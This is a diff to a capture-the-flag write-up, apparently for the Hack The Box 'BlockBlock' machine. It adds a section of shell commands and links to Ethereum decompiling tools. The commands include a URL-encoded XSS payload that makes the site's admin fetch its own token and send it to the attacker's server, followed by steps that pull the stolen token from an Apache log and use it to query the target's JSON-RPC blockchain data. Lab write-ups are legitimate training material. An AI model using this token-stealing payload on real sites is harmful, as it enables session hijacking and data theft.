@@ -980,6 +980,50 @@ root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token
 }
 ```
 
-### 4.3. Decompiling the Ethereum contract
+### 4.3. Work in progress
+
+#### 4.3.0. Checkpoint commands
+
+```sh
+token=$(curl -s -H 'Content-Type: application/json' -d '{"username": "test", "password": "test"}' http://blockblock.htb/api/login | jq -r .'token')
+systemctl start apache2
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -d '{"username": "%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27http%3A%2F%2F10.10.11.43%2Fapi%2Finfo%27%29.then%28response%20%3D%3E%20%7Breturn%20response.text%28%29%3B%7D%29.then%28dataFromA%20%3D%3E%20%7Breturn%20fetch%28%60http%3A%2F%2F10.10.14.49%2F%3Fd%3D%24%7BdataFromA%7D%60%29%7D%29%22%3E"}' http://blockblock.htb/api/report_user | jq
+token=$(cat /var/log/apache2/access.log | cut -d '%' -f 8 | sed 's/22//')
+chataddr=$(curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" http://blockblock.htb/api/chat_address | tr -d '"')
+rpctoken=$(curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" http://blockblock.htb/api/json-rpc | jq -r .Authorization)
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d "{\"jsonrpc\": \"2.0\", \"method\": \"eth_getBalance\", \"params\": [\"$chataddr\",\"latest\"], \"id\": 1}" http://blockblock.htb/api/json-rpc | jq
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d "{\"jsonrpc\": \"2.0\", \"method\": \"eth_getStorageAt\", \"params\": [\"$chataddr\",\"0x0\",\"latest\"], \"id\": 1}" http://blockblock.htb/api/json-rpc | jq
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d "{\"jsonrpc\": \"2.0\", \"method\": \"eth_getTransactionCount\", \"params\": [\"$chataddr\",\"latest\"], \"id\": 1}" http://blockblock.htb/api/json-rpc | jq
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d "{\"jsonrpc\": \"2.0\", \"method\": \"eth_getCode\", \"params\": [\"$chataddr\",\"latest\"], \"id\": 1}" http://blockblock.htb/api/json-rpc | jq
+```
+
+```sh
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x0",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x1",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x2",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x3",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x4",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x5",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x6",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x7",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x8",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x9",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0xa",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0xb",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0xc",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0xd",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0xe",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
+curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0xf",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
+```
+
+#### 4.3.1. Decompiling the Ethereum contract
 
 https://ethervm.io/decompile
+
+#### 4.3.2. Compiling chat.soi into abi
+
+https://remix.ethereum.org/
+
+#### 4.3.3. Decode Ethereum input data
+
+https://lab.miguelmota.com/ethereum-input-data-decoder/example/
